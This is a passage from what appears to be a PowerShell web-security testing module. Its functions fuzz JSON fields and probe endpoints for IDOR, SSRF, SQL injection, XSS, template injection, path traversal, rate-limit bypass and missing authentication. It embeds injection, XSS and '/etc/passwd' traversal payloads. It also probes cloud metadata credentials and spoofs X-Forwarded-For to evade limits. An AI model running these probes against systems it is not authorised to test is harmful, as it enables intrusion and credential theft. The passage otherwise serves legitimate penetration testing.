        [ValidateSet('POST','PUT','PATCH')]
        [string]$Method = 'POST',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "JSON Field Fuzzing - $Url ($Method, Delay=${DelayMs}ms)"

    try {
        $template = $JsonBody | ConvertFrom-Json -AsHashtable
    } catch {
        _Write-Warn "Invalid JSON: $_"
        return @()
    }

    if ($FieldList.Count -eq 0) { $FieldList = @($template.Keys) }

    $results = @()
    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -Body $JsonBody -ContentType 'application/json' -DelayMs 0 -TimeoutSec $TimeoutSec
    _Write-Info "Baseline: $($baselineResp.StatusCode) Size=$($baselineResp.BodySize)"

    $fuzzValues = @(
        @{Label='null'; Value=$null; JsonValue='null'},
        @{Label='empty_string'; Value=''; JsonValue='""'},
        @{Label='string'; Value='fuzz'; JsonValue='"fuzz"'},
        @{Label='number_0'; Value=0; JsonValue='0'},
        @{Label='number_1'; Value=1; JsonValue='1'},
        @{Label='number_-1'; Value=-1; JsonValue='-1'},
        @{Label='bool_true'; Value=$true; JsonValue='true'},
        @{Label='bool_false'; Value=$false; JsonValue='false'},
        @{Label='array_empty'; JsonValue='[]'},
        @{Label='array_one'; JsonValue='["x"]'},
        @{Label='object_empty'; JsonValue='{}'},
        @{Label='long_string'; JsonValue='"A' + 'A' * 200 + '"'},
        @{Label='sql_injection'; JsonValue='"'' OR ''1''=''1"'},
        @{Label='xss'; JsonValue='"<script>alert(1)</script>"'},
        @{Label='path_traversal'; JsonValue='"../../../etc/passwd"'}
    )

    foreach ($field in $FieldList) {
        foreach ($fv in $fuzzValues) {
            $mutated = $template.Clone()
            if ($fv.ContainsKey('Value')) {
                $mutated[$field] = $fv['Value']
            } else {
                $mutated[$field] = $fv['JsonValue']
            }
            if ($fv['Label'] -eq 'null') {
                # Remove the key entirely to simulate null
                $null
            }
            $mutatedJson = $mutated | ConvertTo-Json -Compress

            $resp = _Invoke-Curl -Url $Url -Method $Method -Body $mutatedJson -ContentType 'application/json' -DelayMs $DelayMs -TimeoutSec $TimeoutSec

            $isAnomaly = $false
            if ($resp.StatusCode -ne $baselineResp.StatusCode) { $isAnomaly = $true }
            if ($resp.BodySize -ne $baselineResp.BodySize -and $resp.BodySize -gt 0) { $isAnomaly = $true }
            $errorBody = $resp.Body -match '(error|exception|traceback|stack)'

            if ($isAnomaly) {
                $msg = "$field = $($fv['Label']) -> $($resp.StatusCode) Size=$($resp.BodySize)"
                if ($errorBody) { $msg += ' [Error]' }
                _Write-Anomaly $msg
            }

            $results += [PSCustomObject]@{
                Field          = $field
                FuzzValue      = $fv['Label']
                StatusCode     = $resp.StatusCode
                BodySize       = $resp.BodySize
                IsAnomaly      = $isAnomaly
                HasError       = $errorBody
                BaselineStatus = $baselineResp.StatusCode
                BaselineSize   = $baselineResp.BodySize
            }
        }
    }

    _Write-Success "JSON field fuzzing complete - $($results.Count) mutations tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-IdorRange
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Enumerate sequential IDs to detect insecure direct object references.
.DESCRIPTION
    Replaces a numeric ID placeholder in the URL with sequential values
    and tracks changes in response size, status code, and content.
    Highlights responses that differ from the baseline (first valid ID).
.PARAMETER Url
    URL template with {id} placeholder (e.g., https://target.com/api/users/{id}).
.PARAMETER StartId
    Starting ID value (default: 1).
.PARAMETER EndId
    Ending ID value (default: 100).
.PARAMETER Step
    Increment step (default: 1).
.PARAMETER AuthHeader
    Authorization header string to include.
.PARAMETER Cookie
    Cookie string to include.
.PARAMETER DelayMs
    Delay between requests (default: 150).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.PARAMETER StopOnAnomaly
    Stop enumeration after detecting an anomaly.
.EXAMPLE
    Invoke-IdorRange -Url 'https://target.com/api/users/{id}' -StartId 1 -EndId 50
#>
function Invoke-IdorRange {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '{id}'})]
        [string]$Url,
        [ValidateRange(0,[int]::MaxValue)]
        [int]$StartId = 1,
        [ValidateRange(0,[int]::MaxValue)]
        [int]$EndId = 100,
        [ValidateRange(1,1000)]
        [int]$Step = 1,
        [string]$AuthHeader = '',
        [string]$Cookie = '',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 150,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15,
        [switch]$StopOnAnomaly
    )

    _Write-Info "IDOR Enumeration - $Url (IDs $StartId..$EndId, step=$Step, delay=${DelayMs}ms)"
    $results = @()
    $baselineSize = 0
    $baselineStatus = 0
    $anomalyFound = $false

    for ($id = $StartId; $id -le $EndId; $id += $Step) {
        if ($StopOnAnomaly -and $anomalyFound) {
            _Write-Warn "Stopping early due to anomaly"
            break
        }

        $fuzzUrl = $Url -replace '{id}', $id.ToString()
        $headersStr = ''
        if ($AuthHeader) { $headersStr = $AuthHeader }
        if ($Cookie) {
            if ($headersStr) { $headersStr += "`n" }
            $headersStr += "Cookie: $Cookie"
        }

        $resp = _Invoke-Curl -Url $fuzzUrl -Method 'GET' -Headers $headersStr -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        if ($id -eq $StartId) {
            $baselineSize = $resp.BodySize
            $baselineStatus = $resp.StatusCode
            _Write-Info "Baseline ID=${id}: Status=$($baselineStatus) Size=$($baselineSize)"
        }

        $isAnomaly = $false
        if ($resp.StatusCode -ne $baselineStatus -and $baselineStatus -gt 0) { $isAnomaly = $true; $anomalyFound = $true }
        if ($resp.BodySize -ne $baselineSize -and $baselineSize -gt 0) { $isAnomaly = $true }
        $hasDataInBody = $resp.Body -notmatch '(not found|error|invalid|does not exist|404|null|\[\])'

        if ($isAnomaly) {
            $msg = "ID=$id -> $($resp.StatusCode) Size=$($resp.BodySize)"
            if ($hasDataInBody) { $msg += ' [Has content]' }
            _Write-Anomaly $msg
        }

        $results += [PSCustomObject]@{
            Id             = $id
            Url            = $fuzzUrl
            StatusCode     = $resp.StatusCode
            BodySize       = $resp.BodySize
            IsAnomaly      = $isAnomaly
            HasContent     = $hasDataInBody
            BaselineStatus = $baselineStatus
            BaselineSize   = $baselineSize
        }
    }

    $summaryMsg = if ($anomalyFound) { 'anomalies found' } else { 'no anomalies' }
    _Write-Success "IDOR enumeration complete - $($results.Count) IDs tested, $summaryMsg"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-SsrfProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test parameters for Server-Side Request Forgery.
.DESCRIPTION
    Sends SSRF payloads (internal IPs, cloud metadata URLs, file://
    schemes) to parameters likely to trigger outbound requests.
    Replace COLLABORATOR in payloads with your webhook.site or
    Burp Collaborator URL for out-of-band detection.
.PARAMETER Url
    Target URL.
.PARAMETER Parameter
    The parameter name to fuzz for SSRF.
.PARAMETER Wordlist
    Array of SSRF payloads.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER CollaboratorUrl
    Your webhook.site / Burp Collaborator URL to replace COLLABORATOR placeholder.
.PARAMETER BodyTemplate
    For POST/PUT, a JSON template where __PARAM__ is replaced with the payload.
.PARAMETER DelayMs
    Delay between requests (default: 200).
.PARAMETER TimeoutSec
    Per-request timeout (default: 20).
.EXAMPLE
    Invoke-SsrfProbe -Url 'https://target.com/api/fetch' -Parameter 'url' -CollaboratorUrl 'https://YOUR.webhook.site/ID'
#>
function Invoke-SsrfProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Parameter = 'url',
        [string[]]$Wordlist = (Get-Wordlist -Category ssrf),
        [ValidateSet('GET','POST','PUT')]
        [string]$Method = 'GET',
        [string]$CollaboratorUrl = '',
        [string]$BodyTemplate = '{"url":"__PARAM__"}',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 200,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 20
    )

    _Write-Info "SSRF Probe - $Url (param=$Parameter, method=$Method, delay=${DelayMs}ms)"
    if ($CollaboratorUrl) {
        _Write-Info "Using collaborator: $CollaboratorUrl"
        _Write-Warn "Remember to check your collaborator for incoming requests after testing"
    }

    $results = @()
    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -DelayMs 0 -TimeoutSec $TimeoutSec

    foreach ($payload in $Wordlist) {
        $actualPayload = $payload
        if ($CollaboratorUrl) {
            $actualPayload = $payload -replace 'COLLABORATOR', $CollaboratorUrl
        }

        $body = ''
        $contentType = ''
        $queryString = ''

        if ($Method -eq 'GET') {
            $queryString = "$Parameter=$([System.Uri]::EscapeDataString($actualPayload))"
            $sep = if ($Url.Contains('?')) { '&' } else { '?' }
            $fuzzUrl = "$Url$sep$queryString"
        } else {
            $fuzzUrl = $Url
            $body = $BodyTemplate -replace '__PARAM__', $actualPayload
            $contentType = 'application/json'
        }

        $resp = _Invoke-Curl -Url $fuzzUrl -Method $Method -Body $body -ContentType $contentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        if ($resp.StatusCode -ne $baselineResp.StatusCode) { $isAnomaly = $true }
        $timingDiff = $resp.Body -match '(timed? out|timeout|connection refused|no route to host|could not resolve)'
        $cloudData = $resp.Body -match '(ami-id|instance-id|public-keys|security-credentials|role-name|meta-data)'

        if ($timingDiff -or $cloudData) { $isAnomaly = $true }

        if ($isAnomaly) {
            $reason = @()
            if ($resp.StatusCode -ne $baselineResp.StatusCode) {
                $reason += "Status change ($($baselineResp.StatusCode)->$($resp.StatusCode))"
            }
            if ($timingDiff) { $reason += 'Timing/timeout anomaly' }
            if ($cloudData) { $reason += 'Cloud metadata in response!' }
            _Write-Anomaly "$actualPayload -> $($resp.StatusCode) $($reason -join ', ')"
        }

        $results += [PSCustomObject]@{
            Payload        = $actualPayload
            StatusCode     = $resp.StatusCode
            BodySize       = $resp.BodySize
            IsAnomaly      = $isAnomaly
            HasCloudData   = $cloudData
            HasTimeout     = $timingDiff
            BaselineStatus = $baselineResp.StatusCode
        }
    }

    _Write-Success "SSRF probe complete - $($results.Count) payloads tested"
    if ($CollaboratorUrl) {
        _Write-Warn "Check $CollaboratorUrl for outbound callbacks"
    }
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-SqliProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test parameters for SQL injection vulnerabilities.
.DESCRIPTION
    Injects SQLi payloads (union, boolean, time-based) into specified
    parameters and analyzes responses for SQL errors, status changes,
    and timing anomalies.
.PARAMETER Url
    Target URL.
.PARAMETER Parameter
    Parameter name to fuzz.
.PARAMETER Wordlist
    Array of SQLi payloads.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER BodyTemplate
    For POST/PUT requests, template where __PARAM__ is replaced with payload.
.PARAMETER DelayMs
    Delay between requests (default: 200).
.PARAMETER TimeoutSec
    Per-request timeout (default: 30).
.EXAMPLE
    Invoke-SqliProbe -Url 'https://target.com/api/users' -Parameter 'id'
#>
function Invoke-SqliProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Parameter = 'id',
        [string[]]$Wordlist = (Get-Wordlist -Category sqli),
        [ValidateSet('GET','POST','PUT')]
        [string]$Method = 'GET',
        [string]$BodyTemplate = '{"id":"__PARAM__"}',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 200,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 30
    )

    _Write-Info "SQLi Probe - $Url (param=$Parameter, method=$Method, delay=${DelayMs}ms)"
    $results = @()
    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -DelayMs 0 -TimeoutSec $TimeoutSec

    foreach ($payload in $Wordlist) {
        $body = ''
        $contentType = ''
        $queryString = ''

        if ($Method -eq 'GET') {
            $queryString = "$Parameter=$([System.Uri]::EscapeDataString($payload))"
            $sep = if ($Url.Contains('?')) { '&' } else { '?' }
            $fuzzUrl = "$Url$sep$queryString"
        } else {
            $fuzzUrl = $Url
            $body = $BodyTemplate -replace '__PARAM__', $payload
            $contentType = 'application/json'
        }

        $startTime = Get-Date
        $resp = _Invoke-Curl -Url $fuzzUrl -Method $Method -Body $body -ContentType $contentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec
        $elapsedMs = [math]::Round(((Get-Date) - $startTime).TotalMilliseconds)

        $isAnomaly = $false
        $sqlErrors = $resp.Body -match '(SQL syntax|MySQL|MariaDB|PostgreSQL|SQLite|ORA-|ODBC|syntax error|unclosed quotation|Warning.*mysql|mysqli_fetch|Division by zero|pg_query|Microsoft OLE DB)'
        $timeBased = ($payload -match '(SLEEP|WAITFOR|BENCHMARK|pg_sleep)') -and ($elapsedMs -gt 5000)
        $statusChanged = $resp.StatusCode -ne $baselineResp.StatusCode

        if ($sqlErrors) { $isAnomaly = $true }
        if ($timeBased) { $isAnomaly = $true }
        if ($statusChanged) { $isAnomaly = $true }

        if ($isAnomaly) {
            $reason = @()
            if ($sqlErrors) { $reason += 'SQL error in response' }
            if ($timeBased) { $reason += "Time-based delay (${elapsedMs}ms)" }
            if ($statusChanged) { $reason += "Status $($baselineResp.StatusCode)->$($resp.StatusCode)" }
            _Write-Anomaly "$payload -> $($resp.StatusCode) $($reason -join ', ')"
        }

        $results += [PSCustomObject]@{
            Payload        = $payload
            StatusCode     = $resp.StatusCode
            BodySize       = $resp.BodySize
            ElapsedMs      = $elapsedMs
            IsAnomaly      = $isAnomaly
            SqlError       = $sqlErrors
            TimeDelay      = $timeBased
            BaselineStatus = $baselineResp.StatusCode
            BaselineSize   = $baselineResp.BodySize
        }
    }

    _Write-Success "SQLi probe complete - $($results.Count) payloads tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-XssProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test parameters for reflected Cross-Site Scripting.
.DESCRIPTION
    Injects XSS payloads into parameters and checks whether the payload
    is reflected in the response body without encoding. Highlights
    unencoded reflection as a potential finding.
.PARAMETER Url
    Target URL.
.PARAMETER Parameter
    Parameter name to fuzz.
.PARAMETER Wordlist
    Array of XSS payloads.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER BodyTemplate
    For POST/PUT, template where __PARAM__ is replaced with payload.
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-XssProbe -Url 'https://target.com/search' -Parameter 'q'
#>
function Invoke-XssProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Parameter = 'q',
        [string[]]$Wordlist = (Get-Wordlist -Category xss),
        [ValidateSet('GET','POST','PUT')]
        [string]$Method = 'GET',
        [string]$BodyTemplate = '{"q":"__PARAM__"}',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "XSS Probe - $Url (param=$Parameter, method=$Method, delay=${DelayMs}ms)"
    $results = @()
    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -DelayMs 0 -TimeoutSec $TimeoutSec

    foreach ($payload in $Wordlist) {
        $body = ''
        $contentType = ''
        $queryString = ''

        if ($Method -eq 'GET') {
            $queryString = "$Parameter=$([System.Uri]::EscapeDataString($payload))"
            $sep = if ($Url.Contains('?')) { '&' } else { '?' }
            $fuzzUrl = "$Url$sep$queryString"
        } else {
            $fuzzUrl = $Url
            $body = $BodyTemplate -replace '__PARAM__', $payload
            $contentType = 'application/json'
        }

        $resp = _Invoke-Curl -Url $fuzzUrl -Method $Method -Body $body -ContentType $contentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $reflected = $resp.Body -match [regex]::Escape($payload)
        $partiallyReflected = $resp.Body -match 'alert\(1\)|onerror|onload|onfocus|onstart|ontoggle'
        $isAnomaly = $reflected

        if ($reflected) {
            _Write-Anomaly "$payload -> REFLECTED in response (Status=$($resp.StatusCode))"
        } elseif ($partiallyReflected) {
            _Write-Anomaly "$payload -> Partially reflected (encoding check needed) (Status=$($resp.StatusCode))"
        }

        $results += [PSCustomObject]@{
            Payload            = $payload
            StatusCode         = $resp.StatusCode
            BodySize           = $resp.BodySize
            Reflected          = $reflected
            PartiallyReflected = $partiallyReflected
            IsAnomaly          = ($reflected -or $partiallyReflected)
            BaselineStatus     = $baselineResp.StatusCode
        }
    }

    _Write-Success "XSS probe complete - $($results.Count) payloads tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-SstiProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test parameters for Server-Side Template Injection.
.DESCRIPTION
    Injects SSTI payloads from multiple template engines (Jinja2, Twig,
    Freemarker, ERB, Velocity, Mako) and checks for evaluated output
    (e.g., {{7*7}} returning '49' instead of '{{7*7}}').
.PARAMETER Url
    Target URL.
.PARAMETER Parameter
    Parameter name to fuzz.
.PARAMETER Wordlist
    Array of SSTI payloads.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER BodyTemplate
    For POST/PUT, template where __PARAM__ is replaced with payload.
.PARAMETER DelayMs
    Delay between requests (default: 150).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-SstiProbe -Url 'https://target.com/greet' -Parameter 'name'
#>
function Invoke-SstiProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Parameter = 'name',
        [string[]]$Wordlist = (Get-Wordlist -Category ssti),
        [ValidateSet('GET','POST','PUT')]
        [string]$Method = 'GET',
        [string]$BodyTemplate = '{"name":"__PARAM__"}',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 150,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "SSTI Probe - $Url (param=$Parameter, method=$Method, delay=${DelayMs}ms)"
    $results = @()

    $evaluationPatterns = @(
        @{Input='{{7*7}}'; Expect='49'; Engine='Jinja2/Twig/Nunjucks'}
        @{Input='${7*7}'; Expect='49'; Engine='Freemarker/Velocity'}
        @{Input='#{7*7}'; Expect='49'; Engine='ERB/Ruby'}
        @{Input='*{7*7}'; Expect='49'; Engine='Thymeleaf'}
        @{Input='<%= 7*7 %>'; Expect='49'; Engine='ERB'}
    )

    foreach ($payload in $Wordlist) {
        $body = ''
        $contentType = ''
        $queryString = ''

        if ($Method -eq 'GET') {
            $queryString = "$Parameter=$([System.Uri]::EscapeDataString($payload))"
            $sep = if ($Url.Contains('?')) { '&' } else { '?' }
            $fuzzUrl = "$Url$sep$queryString"
        } else {
            $fuzzUrl = $Url
            $body = $BodyTemplate -replace '__PARAM__', $payload
            $contentType = 'application/json'
        }

        $resp = _Invoke-Curl -Url $fuzzUrl -Method $Method -Body $body -ContentType $contentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        $detectedEngine = ''

        foreach ($ep in $evaluationPatterns) {
            if ($resp.Body -match [regex]::Escape($ep['Expect'])) {
                $isAnomaly = $true
                $detectedEngine = $ep['Engine']
                break
            }
        }

        $strippedPayload = $payload -replace '[\{\}]', ''
        $payloadGone = $strippedPayload -and ($resp.Body -notmatch [regex]::Escape($strippedPayload))
        if ($payloadGone -and -not $isAnomaly -and $resp.BodySize -gt 0) {
            $isAnomaly = $true
            $detectedEngine = 'Possible evaluation (payload not reflected)'
        }

        if ($isAnomaly) {
            _Write-Anomaly "$payload -> $($resp.StatusCode) [Engine: $detectedEngine]"
        }

        $bodyPreview = $resp.Body.Substring(0, [Math]::Min(200, $resp.Body.Length))
        $results += [PSCustomObject]@{
            Payload    = $payload
            StatusCode = $resp.StatusCode
            BodySize   = $resp.BodySize
            IsAnomaly  = $isAnomaly
            Engine     = $detectedEngine
            BodyPreview = $bodyPreview
        }
    }

    _Write-Success "SSTI probe complete - $($results.Count) payloads tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-LfiProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test parameters for Local File Inclusion / Path Traversal.
.DESCRIPTION
    Injects path traversal payloads into parameters and checks
    responses for signs of successful file inclusion (e.g., contents
    of /etc/passwd, Windows INI files, error messages revealing paths).
.PARAMETER Url
    Target URL.
.PARAMETER Parameter
    Parameter name to fuzz.
.PARAMETER Wordlist
    Array of LFI/path-traversal payloads.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER BodyTemplate
    For POST/PUT, template where __PARAM__ is replaced with payload.
.PARAMETER DelayMs
    Delay between requests (default: 150).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-LfiProbe -Url 'https://target.com/file' -Parameter 'file'
#>
function Invoke-LfiProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$Parameter = 'file',
        [string[]]$Wordlist = (Get-Wordlist -Category lfi),
        [ValidateSet('GET','POST','PUT')]
        [string]$Method = 'GET',
        [string]$BodyTemplate = '{"file":"__PARAM__"}',
        [ValidateRange(0,5000)]
        [int]$DelayMs = 150,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "LFI Probe - $Url (param=$Parameter, method=$Method, delay=${DelayMs}ms)"
    $results = @()
    $baselineResp = _Invoke-Curl -Url $Url -Method $Method -DelayMs 0 -TimeoutSec $TimeoutSec

    $successMarkers = @(
        'root:x:0:0:', 'root:.*:0:0',
        '\[fonts\]', '\[extensions\]',
        'bin/bash', 'bin/sh',
        'daemon:x:1:1',
        'nobody:x:65534',
        'PID', 'ppid',
        'Apache.*Server', 'ServerRoot',
        'PATH=', 'HOME=', 'USER='
    )

    foreach ($payload in $Wordlist) {
        $body = ''
        $contentType = ''
        $queryString = ''

        if ($Method -eq 'GET') {
            $queryString = "$Parameter=$([System.Uri]::EscapeDataString($payload))"
            $sep = if ($Url.Contains('?')) { '&' } else { '?' }
            $fuzzUrl = "$Url$sep$queryString"
        } else {
            $fuzzUrl = $Url
            $body = $BodyTemplate -replace '__PARAM__', $payload
            $contentType = 'application/json'
        }

        $resp = _Invoke-Curl -Url $fuzzUrl -Method $Method -Body $body -ContentType $contentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        $detectedMarkers = @()

        foreach ($marker in $successMarkers) {
            if ($resp.Body -match $marker) {
                $isAnomaly = $true
                $detectedMarkers += $marker
            }
        }

        $fileError = $resp.Body -match '(No such file|not found|failed to open|failed to load|include\(|require\(|file_get_contents|readfile)'

        if ($isAnomaly) {
            _Write-Anomaly "$payload -> $($resp.StatusCode) [Markers: $($detectedMarkers -join ', ')]"
        } elseif ($fileError -and $resp.StatusCode -eq 200) {
            _Write-Anomaly "$payload -> $($resp.StatusCode) [File error in response - path may be processed]"
            $isAnomaly = $true
        }

        $results += [PSCustomObject]@{
            Payload        = $payload
            StatusCode     = $resp.StatusCode
            BodySize       = $resp.BodySize
            IsAnomaly      = $isAnomaly
            Markers        = $detectedMarkers -join ', '
            FileError      = $fileError
            BaselineStatus = $baselineResp.StatusCode
        }
    }

    _Write-Success "LFI probe complete - $($results.Count) payloads tested"
    return $results
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-RateLimitTest
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test endpoint rate limiting and bypass techniques.
.DESCRIPTION
    Sends rapid consecutive requests to detect rate limiting, then
    attempts bypass via X-Forwarded-For rotation, method rotation,
    and parameter pollution.
.PARAMETER Url
    Target URL.
.PARAMETER Method
    HTTP method to test (default: POST for login forms).
.PARAMETER Body
    Request body for POST/PUT requests.
.PARAMETER ContentType
    Content-Type for body requests.
.PARAMETER TotalRequests
    Total number of rapid requests to send (default: 30).
.PARAMETER ConcurrentBurst
    Number of requests in initial burst (default: 10).
.PARAMETER DelayMs
    Delay between requests during enumeration phase (default: 50).
.PARAMETER TimeoutSec
    Per-request timeout (default: 10).
.EXAMPLE
    Invoke-RateLimitTest -Url 'https://target.com/api/login' -TotalRequests 50 -ConcurrentBurst 20
#>
function Invoke-RateLimitTest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [ValidateSet('GET','POST','PUT','PATCH','DELETE')]
        [string]$Method = 'POST',
        [string]$Body = '{"username":"admin","password":"test123"}',
        [string]$ContentType = 'application/json',
        [ValidateRange(5,500)]
        [int]$TotalRequests = 30,
        [ValidateRange(1,100)]
        [int]$ConcurrentBurst = 10,
        [ValidateRange(0,2000)]
        [int]$DelayMs = 50,
        [ValidateRange(1,30)]
        [int]$TimeoutSec = 10
    )

    _Write-Info "Rate Limit Test - $Url ($Method, total=$TotalRequests, burst=$ConcurrentBurst)"
    $phase1Results = @()

    _Write-Info "Phase 1: Sending $ConcurrentBurst rapid requests..."
    $rateLimited = $false
    $limitDetectedAt = 0

    for ($i = 1; $i -le $ConcurrentBurst; $i++) {
        $resp = _Invoke-Curl -Url $Url -Method $Method -Body $Body -ContentType $ContentType -DelayMs 0 -TimeoutSec $TimeoutSec
        $phase1Results += $resp.StatusCode
        _Write-Status "Request $i -> $($resp.StatusCode)"

        if ($resp.StatusCode -eq 429 -or $resp.StatusCode -eq 503) {
            $rateLimited = $true
            $limitDetectedAt = $i
            _Write-Anomaly "Rate limit hit at request $i (429/503)"
            break
        }
        if ($resp.Headers -match '(Retry-After|X-RateLimit|X-Rate-Limit|RateLimit|Rate-Limit)') {
            $rateLimited = $true
            $limitDetectedAt = $i
            _Write-Anomaly "Rate limit headers detected at request $i"
            break
        }
    }

    _Write-Info "Phase 2: Testing X-Forwarded-For bypass..."
    $bypassResults = @()
    for ($i = 1; $i -le 10; $i++) {
        $xfw = "X-Forwarded-For: 10.0.0.$i"
        $resp = _Invoke-Curl -Url $Url -Method $Method -Body $Body -ContentType $ContentType -Headers $xfw -DelayMs $DelayMs -TimeoutSec $TimeoutSec
        $bypassResults += $resp.StatusCode
        if ($resp.StatusCode -eq 200 -and $rateLimited) {
            _Write-Anomaly "X-Forwarded-For bypass possible (10.0.0.$i -> $($resp.StatusCode))"
        }
    }

    _Write-Info "Phase 3: Testing method rotation bypass..."
    $altMethods = @('GET','PUT','PATCH','DELETE','HEAD','OPTIONS')
    foreach ($am in $altMethods) {
        $altBody = if ($am -in 'GET','HEAD','OPTIONS') { '' } else { $Body }
        $resp = _Invoke-Curl -Url $Url -Method $am -Body $altBody -ContentType $ContentType -DelayMs $DelayMs -TimeoutSec $TimeoutSec
        _Write-Status "$am -> $($resp.StatusCode)"
    }

    if ($rateLimited) {
        _Write-Anomaly "Rate limit detected after $limitDetectedAt requests"
    } else {
        _Write-Success "No rate limiting detected (status 429/503 not observed)"
    }

    return [PSCustomObject]@{
        Url              = $Url
        RateLimited      = $rateLimited
        LimitAt          = $limitDetectedAt
        Phase1Statuses   = $phase1Results
        BypassStatuses   = $bypassResults
        XForwardedBypass = ($bypassResults -contains 200)
    }
}

# ──────────────────────────────────────────────────────────────────────────────
# FUNCTION: Invoke-NoAuthProbe
# ──────────────────────────────────────────────────────────────────────────────

<#
.SYNOPSIS
    Test endpoints with missing or invalid authentication.
.DESCRIPTION
    Sends requests with various auth header manipulations - no auth,
    empty token, expired token, modified token to detect
    authorization bypasses and improper access control.
.PARAMETER Url
    Target URL.
.PARAMETER ValidAuthHeader
    A known valid authorization header to compare against.
.PARAMETER Method
    HTTP method (default: GET).
.PARAMETER Wordlist
    Array of auth header hashtables to test.
.PARAMETER DelayMs
    Delay between requests (default: 100).
.PARAMETER TimeoutSec
    Per-request timeout (default: 15).
.EXAMPLE
    Invoke-NoAuthProbe -Url 'https://target.com/api/admin/users' -ValidAuthHeader 'Bearer eyJhbGciOi...'
#>
function Invoke-NoAuthProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory,Position=0)]
        [ValidateScript({$_ -match '^https?://'})]
        [string]$Url,
        [string]$ValidAuthHeader = '',
        [ValidateSet('GET','POST','PUT','PATCH','DELETE')]
        [string]$Method = 'GET',
        [hashtable[]]$Wordlist = $script:NoAuthHeaders,
        [ValidateRange(0,5000)]
        [int]$DelayMs = 100,
        [ValidateRange(1,120)]
        [int]$TimeoutSec = 15
    )

    _Write-Info "No-Auth Probe - $Url ($Method, delay=${DelayMs}ms)"

    $results = @()
    $validResp = $null
    if ($ValidAuthHeader) {
        $validResp = _Invoke-Curl -Url $Url -Method $Method -Headers $ValidAuthHeader -DelayMs 0 -TimeoutSec $TimeoutSec
        _Write-Info "Valid auth baseline: $($validResp.StatusCode) Size=$($validResp.BodySize)"
    }

    foreach ($authHeaders in $Wordlist) {
        $headersStr = ''
        if ($authHeaders.Count -gt 0) {
            $pairs = @()
            foreach ($entry in $authHeaders.GetEnumerator()) {
                $pairs += "$($entry.Key): $($entry.Value)"
            }
            $headersStr = $pairs -join "`n"
        }

        $resp = _Invoke-Curl -Url $Url -Method $Method -Headers $headersStr -DelayMs $DelayMs -TimeoutSec $TimeoutSec

        $isAnomaly = $false
        if ($resp.StatusCode -eq 200 -and $resp.StatusCode -ne 401 -and $resp.StatusCode -ne 403) {
            $isAnomaly = $true
            $keys = [string]::Join(', ', @($authHeaders.Keys))
